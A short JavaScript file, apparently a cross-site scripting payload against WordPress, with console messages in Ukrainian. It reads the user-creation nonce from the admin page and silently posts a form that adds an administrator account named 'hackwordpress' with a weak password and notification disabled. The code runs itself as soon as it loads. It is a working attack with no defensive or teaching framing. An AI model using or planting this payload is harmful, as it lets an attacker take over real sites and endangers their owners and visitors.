function addAdminUser() {
    var uri = "/wp-admin/user-new.php";
    var username = "hackwordpress";
    var email = "hacker%40evil.com";
    var password = "passw0rd";

    var xhr = new XMLHttpRequest();
    xhr.open("GET", uri, true);
    xhr.send(null);

    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE && xhr.status == 200) {
            var response = xhr.responseText;
            var noncePos = response.indexOf('name="_wpnonce_create-user" value="');

            if (noncePos === -1) {
                console.log("Nonce не знайдено!");
                return;
            }

            var nonceVal = response.substring(noncePos + 35, noncePos + 45);
            console.log("Nonce: " + nonceVal);

            console.log("Додаємо користувача...");
            var xhr2 = new XMLHttpRequest();
            xhr2.open("POST", uri, true);
            xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

            var body = "action=createuser&";
            body += "_wpnonce_create-user=" + nonceVal + "&";
            body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&";
            body += "user_login=" + username + "&";
            body += "email=" + email + "&";
            body += "first_name=&last_name=&uri=&";
            body += "pass1=" + password + "&pass1-text=" + password + "&";
            body += "pass2=" + password + "&pw_weak=on&";
            body += "send_user_notification=0&";
            body += "role=administrator&";
            body += "ure_select_other_roles=&createuser=Add+New+User";

            xhr2.send(body);
        }
    };
}

addAdminUser();
